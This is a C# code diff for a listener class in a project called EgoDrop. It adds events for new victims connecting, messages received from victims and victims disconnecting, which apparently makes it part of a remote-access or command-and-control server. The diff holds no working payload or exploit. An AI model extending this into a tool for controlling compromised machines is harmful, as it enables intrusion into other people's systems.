@@ -16,19 +16,41 @@ namespace EgoDrop
         public clsSqlite.stListener m_stListener { get; set; }
         public bool m_bIsListening { get; set; }
 
+        public delegate void dlgNewVictim(clsListener listener, clsVictim victim);
+        public event dlgNewVictim evtNewVictim;
+        public delegate void dlgReceivedMessage(clsListener listener, clsVictim victim, List<string> lsMsg);
+        public event dlgReceivedMessage evtReceivedMessage;
+        public delegate void dlgVictimDisconnected(clsListener listener, clsVictim victim);
+        public event dlgVictimDisconnected evtVictimDisconnected;
+
         public clsListener()
         {
-            m_bIsListening = false;
+            
         }
 
         public virtual void fnStart()
         {
-
+            
         }
 
         public virtual void fnStop()
         {
 
+        }
+
+        public void fnOnNewVictim(clsVictim victim)
+        {
+            evtNewVictim?.Invoke(this, victim);
+        }
+
+        public void fnOnReceivedMessage(clsVictim victim, List<string> lsMsg)
+        {
+            evtReceivedMessage?.Invoke(this, victim, lsMsg);
+        }
+
+        public void fnOnVictimDisconnected(clsVictim victim)
+        {
+            evtVictimDisconnected?.Invoke(this, victim);
         }
     }
 }
